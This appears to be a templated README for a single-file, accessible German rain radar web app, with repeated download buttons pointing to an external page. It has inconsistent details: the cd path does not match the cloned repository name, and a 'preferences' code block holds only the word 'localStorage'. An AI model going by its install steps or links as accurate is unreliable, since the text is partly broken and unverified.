# Accessible Rain Radar v2026 - weather radar 2026

> **A screen-reader accessible rain radar web app with text-first nowcast, forecast, and warning views in English and German.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/parkermichaeljee3750/accessible-rain-radar-2026?style=flat-square)](https://github.com/parkermichaeljee3750/accessible-rain-radar-2026)

---

<p align="center">
  <a href="https://parkermichaeljee3750.github.io/accessible-rain-radar-2026/">
    <img src="https://img.shields.io/badge/Download-Accessible%20Rain%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download Accessible Rain Radar">
  </a>
</p>

> **[Download Accessible Rain Radar v2026](https://parkermichaeljee3750.github.io/accessible-rain-radar-2026/)**

---

[Download Latest Build](https://parkermichaeljee3750.github.io/accessible-rain-radar-2026/)

---

## What Accessible Rain Radar is

Accessible Rain Radar is a compact, single-file web application built for weather checks in Germany. Instead of leaning on image-heavy maps, it presents rain radar, short-term nowcast information, and forecast data in a text-oriented format that is easier to use with screen readers and keyboards.

The interface keeps the experience straightforward: bilingual English and German content, organized sections, and preferences that stay saved in the browser. It is aimed at users who want fast, readable weather information with minimal interaction overhead.

---

## Highlights

- One standalone HTML file, with no extra dependencies for deployment
- Text-based rain radar output designed for screen reader use
- Clear nowcast summaries written for quick scanning
- Structured precipitation timeline table
- Compass-style direction view for added weather context
- Hourly forecast plus a 5-day forecast section
- DWD thunderstorm warnings for Germany
- Keyboard-accessible tabs with table or list display modes
- Preferences stored in LocalStorage
- English and German interface content

---

## Installation

1. Download or clone the repository.
2. Put the HTML file on any web server, or open it locally in a browser.
3. No build step is needed.

Clone the project:

    git clone https://github.com/parkermichaeljee3750/accessible-rain-radar-2026.git
    cd accessible-rain-radar

Open the HTML file directly in a browser, or serve it with your preferred static web server.

---

## Using the app

After opening the app, pick the section that matches what you need:

- Check the nowcast area for a quick near-term rain snapshot
- Move between timeline, table, and list layouts for a more comfortable reading setup
- Use the compass view to get directional context
- Look at the hourly and 5-day forecast sections for a wider outlook
- Review DWD thunderstorm warnings when they are available
- Use the keyboard to travel through tabs and page sections

If you host the file yourself, refresh the browser after updates so the newest content and interface changes are loaded.

---

## Settings and storage

The app keeps its settings in browser localStorage, which allows it to remember choices such as language and view preferences.

Typical browser-stored preferences include:

    localStorage

To clear saved preferences, remove the site's data in your browser settings.

---

## Requirements

- A modern web browser
- JavaScript-enabled browsing environment
- LocalStorage support for saved preferences
- Network access for weather data sources and map-related lookups where applicable
- Data coverage focused on Germany

---

## FAQ

**Does it need a build step?**  
No. It is provided as a single HTML file that you can open or host directly.

**Is both English and German supported?**  
Yes. The interface includes both languages.

**Where are my settings saved?**  
They are stored in localStorage in the browser.

**Which data sources does it reference?**  
The profile references DWD, Bright Sky, Open-Meteo, and Photon.

**I changed the file, but the old interface is still showing. What now?**  
Refresh the page and, if necessary, clear cached site data.

**How do I get the newest release?**  
Use the download link at the top of this README to reach the current build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
